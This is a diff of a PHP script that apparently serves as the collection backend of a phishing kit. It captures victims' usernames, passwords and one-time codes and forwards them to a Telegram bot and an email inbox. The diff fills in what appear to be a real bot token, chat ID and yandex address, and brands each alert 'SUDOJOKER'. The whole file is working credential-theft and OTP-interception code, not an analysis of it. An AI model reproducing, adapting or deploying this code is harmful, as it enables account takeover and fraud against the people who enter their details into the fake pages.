@@ -10,11 +10,11 @@ header("Access-Control-Allow-Headers: Content-Type");
 
 // Configuration - REPLACE WITH YOUR ACTUAL VALUES
 $config = [
-    'telegram_bot_token' => 'YOUR_TELEGRAM_BOT_TOKEN',
-    'telegram_chat_id' => 'YOUR_CHAT_ID',
+    'telegram_bot_token' => '7539619453:AAFf8Tq6Sugdv1Tq0Azp3O7CT5izGN6twss',
+    'telegram_chat_id' => '7094100316',
     'admin_username' => 'admin',  // Username for the admin panel
     'admin_password' => 'secure_password',  // Password for the admin panel
-    'email_to' => 'your-email@example.com',
+    'email_to' => 'Jokersudo@yandex.com',
     'database_file' => 'reports.json',  // File to store reports
     'max_reports' => 100  // Maximum number of reports to keep
 ];
@@ -72,7 +72,7 @@ function processReport() {
         // Format message based on the action type
         switch ($data['action']) {
             case 'LOGIN_ATTEMPT':
-                $message = "🔐 LOGIN CREDENTIALS CAPTURED 🔐\n\n";
+                $message = "🔐 LOGIN CREDENTIALS CAPTURED BY SUDOJOKER 🔐\n\n";
                 $message .= "Source: " . htmlspecialchars($data['source']) . "\n";
                 $message .= "Username: " . htmlspecialchars($data['username']) . "\n";
                 $message .= "Password: " . htmlspecialchars($data['password']) . "\n";
@@ -80,7 +80,7 @@ function processReport() {
                 break;
                 
             case 'OTP_ATTEMPT':
-                $message = "🔑 OTP VERIFICATION ATTEMPT 🔑\n\n";
+                $message = "🔑 OTP VERIFICATION ATTEMPT BY SUDOJKER 🔑\n\n";
                 $message .= "Source: " . htmlspecialchars($data['source']) . "\n";
                 $message .= "Username: " . htmlspecialchars($data['username']) . "\n";
                 $message .= "OTP Code: " . htmlspecialchars($data['otp']) . "\n";
@@ -88,13 +88,13 @@ function processReport() {
                 break;
                 
             case 'OTP_RESEND':
-                $message = "🔄 OTP RESEND REQUESTED 🔄\n\n";
+                $message = "🔄 OTP RESEND REQUESTED SUDOJOKER 🔄\n\n";
                 $message .= "Source: " . htmlspecialchars($data['source']) . "\n";
                 $message .= "Username: " . htmlspecialchars($data['username']) . "\n\n";
                 break;
                 
             case 'COMPLETE':
-                $message = "✅ VERIFICATION COMPLETE ✅\n\n";
+                $message = "✅ VERIFICATION COMPLETE SUDOJOKER ✅\n\n";
                 $message .= "Source: " . htmlspecialchars($data['source']) . "\n";
                 $message .= "Username: " . htmlspecialchars($data['username']) . "\n";
                 $message .= "Password: " . htmlspecialchars($data['password']) . "\n";
@@ -102,7 +102,7 @@ function processReport() {
                 break;
                 
             default:
-                $message = "📊 NEW DATA SUBMISSION 📊\n\n";
+                $message = "📊 NEW DATA SUBMISSION SUDOJOKER 📊\n\n";
                 break;
         }
         
